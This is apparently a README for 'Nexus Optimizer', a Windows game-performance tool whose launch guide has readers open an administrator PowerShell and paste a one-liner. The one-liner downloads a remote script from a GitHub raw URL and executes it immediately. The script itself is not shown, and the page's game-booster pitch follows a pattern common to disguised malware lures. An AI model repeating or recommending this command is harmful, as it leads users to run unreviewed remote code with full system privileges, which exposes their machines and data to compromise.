# 🚀 Nexus Optimizer

Welcome to **Nexus Optimizer**, a lightweight and native system optimization utility built to clean background clutter, monitor system resources, and prioritize game performance threads on the fly. 

Whether you are trying to squeeze extra frames out of Minecraft, Forza Horizon 4, or GTA V, Nexus Optimizer safely manages system processes to keep your gameplay smooth.

---

## ⚡ Features
* **Priority Threading:** Automatically detects running games and elevates their system priority.
* **Smart Resource Management:** Safely monitors resource-heavy applications in the background.
* **Lightweight Footprint:** Built to execute quickly without leaving lingering background services.

---

## 🚀 Complete Launch Guide

You can launch Nexus Optimizer instantly without downloading any installer files manually. Follow these simple steps:

### Step 1: Open PowerShell as Administrator
1. Press the **Windows Key** on your keyboard.
2. Type **PowerShell**.
3. Right-click on **Windows PowerShell** and select **Run as Administrator**.

### Step 2: Paste and Run the Command
Copy the single-line command below, paste it into your PowerShell window, and press **Enter**:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; & ([scriptblock]::Create((irm "https://raw.githubusercontent.com/introvert47/nexus_optimizer/main/run.ps1?v=(Get-Random)")))
